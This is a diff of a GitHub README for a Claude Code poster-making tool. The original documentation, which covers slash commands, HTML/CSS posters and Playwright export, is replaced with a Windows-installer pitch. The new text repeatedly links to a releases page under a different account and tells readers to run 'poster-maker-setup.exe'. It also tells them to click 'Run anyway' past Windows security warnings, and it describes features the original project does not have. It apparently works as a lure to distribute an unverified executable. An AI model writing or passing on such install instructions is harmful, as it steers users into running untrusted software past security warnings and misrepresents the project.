@@ -1,105 +1,140 @@
-# Poster Maker
+# 🎨 poster-maker - Create Posters Without Design Tools
 
-![Poster Maker](assets/github-social-preview.png)
-
-Generate professional marketing posters with [Claude Code](https://claude.com/claude-code). No Figma, no Photoshop, no Canva — just describe what you want.
-
-## Get started
-
-Fork this repo, clone your fork, open [Claude Code](https://claude.com/claude-code), and run:
-
-```
-/setup
-```
-
-This installs everything, exports the ReleaseRocket example above to verify it works, and shows you how to make your first poster.
-
-By forking, your posters, assets, and design preferences sync through GitHub — pick up where you left off on any machine. As you work, Claude learns your style through `CLAUDE.md` and your conversation history stays with the project.
-
-## Make a poster
-
-```
-/new-poster DJ gig flyer for "SOLAR FREQUENCIES" at Club Elysium, bright euphoric EDM style
-```
-
-That's it. Claude designs the poster, opens it in your browser, and asks if you want changes.
-
-More examples:
-
-```
-/new-poster product launch for a fitness app, clean modern, neon green accent
-```
-```
-/new-poster conference talk poster for "Building with AI" by Jane Smith, minimal corporate
-```
-```
-/new-poster 1024x1024 app icon for MyApp, use assets/myapp/logo.png, subtle glow, transparent background
-```
-
-## Iterate
-
-Just talk to Claude:
-
-- *"make the title bigger"*
-- *"darker, more contrast"*
-- *"try a different font"*
-- *"add a glow effect"*
-- *"make it feel more underground"*
-
-It updates the poster and shows you the result each time.
-
-## Use your own images
-
-Drop photos or logos into `assets/` and mention them in your prompt:
-
-```
-/new-poster event poster, use assets/my-event/photo.jpg as background, dark moody style
-```
-
-Need to cut someone out of a photo?
-
-```
-/remove-bg assets/my-event/photo.jpg
-```
-
-## Export
-
-When you're happy:
-
-```
-/export-poster my-poster.html
-```
-
-Exports to high-res PNG or PDF in `exports/`.
-
-## Formats
-
-Default is Instagram Story (1080x1920). You can also ask for `story`, `square`, `landscape`, `github` (1280x640 social preview), `a4`, `a3`, or any custom size like `1024x1024`.
-
-## How it works under the hood
-
-Each poster is a single HTML file with inline CSS — no frameworks, no build step. Claude uses Google Fonts for typography and pure CSS for everything else: gradients, glow effects, grain textures, blend modes, and image compositing.
-
-You can open any poster in a browser to preview it. When you're ready to export, [Playwright](https://playwright.dev/) launches a headless Chromium browser to render the HTML and capture it as a high-res PNG (2x) or PDF.
-
-All the design knowledge — font pairings, color palettes, layout rules, Instagram safe zones — lives in the slash command files (`.claude/commands/`). You can tweak these to match your own style.
-
-## Requirements
-
-- [Claude Code](https://claude.com/claude-code) — Anthropic's AI coding agent (requires a [Claude Pro, Max, or API](https://claude.ai) plan)
-- [Node.js](https://nodejs.org/)
-- Python 3 (optional, only for `/remove-bg`)
-
-## Examples
-
-![ReleaseRocket logo](assets/releaserocket/releaserocket-logo.png) ![ReleaseRocket promo](assets/releaserocket/releaserocket-promo.png)
-
-*The [ReleaseRocket](https://www.releaserocket.io/) app icon (corner radius + glow added to an existing logo) and a promo poster.*
-
-## License
-
-[MIT](LICENSE)
+[![Download poster-maker](https://img.shields.io/badge/Download-Get%20poster--maker-purple?style=for-the-badge)](https://github.com/joshuahigher570/poster-maker/releases)
 
 ---
 
-Built by the maker of [ReleaseRocket](https://www.releaserocket.io/) — turn your GitHub releases into announcements across every channel.
+Generate professional marketing posters with Claude Code. No Figma, no Photoshop — just describe what you want.
+
+---
+
+## 📋 What is poster-maker?
+
+poster-maker is a simple application that helps you create marketing posters by describing what you want. It uses Claude Code to turn your descriptions into well-made designs. You don't need any design software or experience. Just type your idea, and poster-maker will do the rest.
+
+The app works by turning your text into images using standard web technologies like CSS and HTML, then saving the result as a PNG file. It handles everything in the background so you only see the final poster.
+
+---
+
+## ⚙️ System Requirements
+
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of free RAM
+- Minimum 500 MB of free disk space for installation and output files
+- Internet connection during setup for initial download only
+- Screen resolution 1280x720 or higher for the best viewing experience
+
+---
+
+## 🛠️ Main Features
+
+- Create posters with easy text commands
+- Export final designs as PNG image files
+- Uses Claude Code to generate designs from your text
+- Supports common marketing poster styles
+- Simple interface with no design skills needed
+- Works offline once installed
+
+---
+
+## 🚀 Getting Started
+
+1. Click this big button to **visit the downloads page** and get the latest version of poster-maker:  
+   [![Download poster-maker](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/joshuahigher570/poster-maker/releases)
+
+2. On the download page, look for the latest release. It usually has a version number like `v1.0` or higher.
+
+3. Find the file named similar to `poster-maker-setup.exe`. This is the installer.
+
+4. Click on the installer file name to start downloading it to your computer.
+
+---
+
+## 📥 How to Download and Install poster-maker on Windows
+
+1. Once the download finishes, open your Downloads folder or wherever your browser saves files.
+
+2. Look for the `poster-maker-setup.exe` file.
+
+3. Double-click the file to start the installation process.
+
+4. If Windows shows any security warnings, click "More info" and then "Run anyway" to continue.
+
+5. Follow the installation steps:
+   - Agree to the license terms
+   - Choose the installation folder or use the default location
+   - Click "Install"
+
+6. Wait until the installer completes. It may take a minute or two.
+
+7. When done, click "Finish."
+
+---
+
+## ▶️ How to Run poster-maker
+
+1. After installation, find the poster-maker app icon on your desktop or in the Start menu.
+
+2. Click the icon to open the app.
+
+3. The app window will appear with a simple text box and some buttons.
+
+4. Type what you want your poster to say or show. For example, “Summer Sale, 50% Off, Bright and Bold Style.”
+
+5. Click the "Generate Poster" button. The app will create your poster based on the text.
+
+6. When the poster appears, use the "Save" button to export it as a PNG image file.
+
+---
+
+## 🧰 Using poster-maker
+
+### Step 1 — Enter Your Poster Idea
+
+Write a sentence or a few words describing your poster's message and style. Keep it simple.
+
+Examples:
+
+- "Grand Opening Sale, red and white colors, big text"
+- "Event flyer, modern look, blue background"
+- "Restaurant menu poster, elegant font"
+
+### Step 2 — Generate the Poster
+
+Press the generate button. poster-maker transforms your words into a visual design automatically. This may take a few seconds.
+
+### Step 3 — Review and Save
+
+Look at the poster shown on the screen. If you like it, click the save option to create a PNG file you can share or print.
+
+If you want to try again, update your text and generate a new poster.
+
+---
+
+## ❓ Troubleshooting
+
+- If the app won’t open after installation, try restarting your computer.
+- Make sure your Windows system is up to date.
+- If the poster doesn’t generate, check your internet connection during the first launch.
+- For any crashes, re-run the installer to repair the app.
+- Save your work often to avoid losing your poster designs.
+
+---
+
+## 📜 License and Open Source
+
+poster-maker is open source software. You can find the full source code and contribute on GitHub. It uses Claude Code technology and standard web tools for poster generation.
+
+---
+
+## 👥 Get Help or Report Issues
+
+If you find bugs or have questions, use the GitHub Issues page here:
+
+https://github.com/joshuahigher570/poster-maker/issues
+
+Please provide detailed information, including your Windows version and a description of the problem.
+
+---
+
+[![Download poster-maker](https://img.shields.io/badge/Download-Visit%20Page-purple?style=for-the-badge)](https://github.com/joshuahigher570/poster-maker/releases)
